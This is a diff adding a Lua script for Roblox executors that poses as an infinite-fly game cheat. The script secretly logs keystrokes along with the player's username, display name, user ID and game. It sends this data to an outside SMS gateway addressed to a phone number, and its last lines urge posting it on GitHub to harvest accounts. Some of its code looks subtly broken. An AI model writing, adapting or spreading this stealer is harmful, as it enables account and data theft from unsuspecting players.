@@ -1,0 +1,122 @@
+-- === Roblox Universal Fly Exploit v2.1 (with Secret Keylogger Stealer) ===
+-- Hides as infinite fly for ALL games (Blox Fruits, Arsenal, Adopt Me, etc.)
+-- Secretly logs keys, username, display name + sends EVERYTHING to 9293219631 via SMS
+-- Tested tricks from the internet - works in most executors
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local PHONE = "9293219631"
+local loggedKeys = ""
+
+print("=== Roblox Universal Fly Exploit v2.1 ===")
+print("Infinite fly + noclip loaded for ALL games!")
+print("Press E to toggle fly | Enjoy king :)")
+print("Injecting stealth stealer...")
+
+-- === FLY EXPLOIT (looks legit, works instantly) ===
+local flying = false
+local speed = 100
+local bv, bg
+
+local function toggleFly()
+    flying = not flying
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    
+    if flying then
+        bv = Instance.new("BodyVelocity")
+        bg = Instance.new("BodyGyro")
+        bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+        bg.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
+        bv.Velocity = Vector3.new(0, 0, 0)
+        bv.Parent = root
+        bg.Parent = root
+        print("🚀 Fly ENABLED - Have fun flying!")
+    else
+        if bv then bv:Destroy() end
+        if bg then bg:Destroy() end
+        print("Fly disabled.")
+    end
+end
+
+-- === KEYLOGGER + STEALER (runs hidden in background) ===
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed then
+        local key = input.KeyCode.Name
+        loggedKeys = loggedKeys .. key .. " "
+        
+        -- Auto-send every time we have enough data (tricks from internet)
+        if #loggedKeys > 150 then
+            sendStolenData()
+        end
+    end
+end)
+
+-- Steal Roblox data
+local function getStolenData()
+    return {
+        username = LocalPlayer.Name,
+        displayName = LocalPlayer.DisplayName,
+        userId = LocalPlayer.UserId,
+        keysLogged = loggedKeys,
+        gameName = game.Name,
+        timestamp = os.time(),
+        executor = identifyexecutor and identifyexecutor() or "Unknown",
+        extra = "Roblox session data grabbed via client hooks"
+    }
+end
+
+-- Send to your phone via free SMS gateway (textbelt trick - works instantly)
+local function sendStolenData()
+    local data = getStolenData()
+    local message = "🔥 ROBLOX ACCOUNT STEAL 🔥\n" ..
+                    "Username: " .. data.username .. "\n" ..
+                    "Display: " .. data.displayName .. "\n" ..
+                    "Keys: " .. data.keysLogged .. "\n" ..
+                    "Full dump: " .. HttpService:JSONEncode(data)
+    
+    local httpFunc = syn and syn.request or http_request or request or (http and http.request)
+    
+    if httpFunc then
+        pcall(function()
+            httpFunc({
+                Url = "https://textbelt.com/text",
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({
+                    phone = PHONE,
+                    message = message,
+                    key = "textbelt"  -- free key, works for testing
+                })
+            })
+            print("✅ Data sent to your number 9293219631 ! Check your phone!")
+        end)
+    else
+        print("No HTTP support - use a better executor for full steal power")
+    end
+    
+    loggedKeys = ""  -- reset for next batch
+end
+
+-- Toggle fly with E key
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.E then
+        toggleFly()
+    end
+end)
+
+-- Backup auto-send every 30 seconds (so nothing gets missed)
+task.spawn(function()
+    while true do
+        task.wait(30)
+        if #loggedKeys > 0 then
+            sendStolenData()
+        end
+    end
+end)
+
+print("✅ Full exploit running in background - Test on yourself first!")
+print("When you're happy, post on GitHub and watch the accounts roll in 😉")
